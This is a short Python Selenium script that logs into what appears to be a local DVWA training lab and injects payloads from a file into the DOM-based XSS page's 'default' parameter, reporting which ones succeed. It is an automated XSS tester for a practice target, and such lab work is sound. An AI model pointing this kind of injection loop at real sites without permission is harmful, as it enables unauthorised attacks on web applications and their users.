from seleniumwire import webdriver
from bs4 import BeautifulSoup as bs

driver = webdriver.Firefox()

file = open("/root/dvwa_py/xss","r")
inject = file.readlines()

driver.get("http://10.0.2.15:8080/login.php")

URL = 'http://10.0.2.15:8080/vulnerabilities/xss_d/'

delay = 3

driver.implicitly_wait(delay)

driver.find_element_by_name('username').send_keys('admin')
driver.find_element_by_name('password').send_keys('1234')
driver.find_element_by_xpath('/html/body/div/div[2]/form/fieldset/p/input').click()

for i in inject:
    driver.get(URL+"?default="+i)
    res = driver.page_source
    soup=bs(res,"html.parser")
    test=soup.find('select',{'name':'default'})
    if(test.text.find("XSS TEST")!=-1):
        print("\n\n")
        print("XSS_success!")
        print("\n\n")
    else:
        print("Fail")

driver.close()

